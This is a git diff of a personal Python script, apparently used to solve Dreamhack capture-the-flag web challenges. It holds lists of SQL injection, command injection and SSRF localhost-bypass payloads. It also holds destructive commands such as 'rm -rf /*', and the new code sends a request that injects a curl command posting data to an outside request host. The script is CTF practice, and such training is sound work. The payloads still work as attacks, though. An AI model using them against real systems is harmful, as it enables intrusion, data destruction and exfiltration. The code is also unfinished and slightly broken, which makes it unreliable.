4c2c89c4783378231ce21d34f5defdc6f5a5396c
colaf <colaf@colaf.net>
2023-08-03 18:01:18 +0900

    flag.py

--- flag.py
+++ flag.py
@@ -3,14 +3,15 @@ import re
 import string, json
 
 host = 'http://host3.dreamhack.games'
-port = '18688'
-url = host+':'+port+'/ping'
+port = '10214'
+url = host+':'+port
 headers = {'Content-Type': 'application/json; charset=utf-8'}
 cookies = {
         'username': 'admin',
         'sessionid': '20642b2f8484ec17cb44fa25680ead4791ac6bfedc29f04de00d364cf4d70c5f'}
-params = {}
-data = {'host': '8.8.8.8";cat "/app/flag.py'}
+data = {'cmd': 'ls'
+        #'host': '8.8.8.8";cat "/app/flag.py'
+        }
 payloadSQL = ['admin\' OR \'1',                 # admin' OR '1
               'admin\' OR 1 -- -',              # admin' OR 1 -- -
               '" OR "" = "',                    # " OR "" = "
@@ -26,17 +27,45 @@ payloadCommandInjection = [';ls "."',           # ;ls "."
                            ';cat /tmp/flag',    # ;cat /tmp/flag
                            '";cat /tmp/flag'    # ";cat /tmp/flag
                            ]
+payloadCommand = ['rm ./',
+                  'rm -rf ./*',
+                  'rm -rf /*',
+                  'cp -rf ./* ../',
+                  'cat /',
+                  'clear',
+                  'ping http://localhost',
+                  'whois https://naver.com',
+                  '가나다']
 
-for payload in payloadCommandInjection:
-    data = {'host': '8.8.8.8'+payload}
-    response = requests.post(url, data=data)
-    print("================================================================")
-    print("Command injection payload: " + payload)
-    print(response.text)
+#for payload in payloadCommandInjection:
+#    data = {'host': '8.8.8.8'+payload}
+#    response = requests.post(url, data=data)
+#    print("================================================================")
+#    print("Command injection payload: " + payload)
+#    print(response.text)
+#
+
+payloadLocalhost = ['http://localhost',
+                    'http://vcap.me',
+                    'http://0x7f.0x00.0x00.0x01',
+                    'http://0x7f000001',
+                    'http://2130706433',
+                    'http://Localhost',
+                    'http://127.0.0.255'
+                    'http://127.1',
+                    ]
+regex_flag = re.compile('DH{.*}')
+ALPHANUMERIC = string.digits + string.ascii_letters
+flag = ''
+def refineResponse(text):
+    text = re.sub('<head>(.|\n)*</head>', '', text)
+    text = re.sub('\n(\n|\s)*\n', '', text)
+    return text
+def detector(text):
+    regex_flag
 # response = requests.get("http://host1.dreamhack.games:19500/", verify=False, cookies=cookies)
 # verify=False SSL 인증서 에러가 나서 추가해줬다.
 
-regex_flag = re.compile('DH{.*}')
 
 #if len(regex_flag.findall(response.text))>0:
 #    print("1")
@@ -45,8 +74,6 @@ regex_flag = re.compile('DH{.*}')
 #    print("2")
 #    print(response.text)
 
-ALPHANUMERIC = string.digits + string.ascii_letters
-flag = ''
 #for i in range(32):
 #    for char in ALPHANUMERIC:
  #       response = requests.get(host+':'+port+'/login?uid[$regex]=ad.in&upw[$regex]=^D.{'+flag+char+'.*}', verify=False)
@@ -56,3 +83,9 @@ flag = ''
      #       break
 
 #print(response.text)
+response = requests.head(url+'?cmd= curl https://mjmqxqr.request.dreamhack.games -d "hello"', verify=False)
+#for param in payloadCommand:
+#    params = {'cmd': param}
+#    print("================================================================")
+#    print("Command injection payload: " + param)
+#    print(refineResponse(response.text))
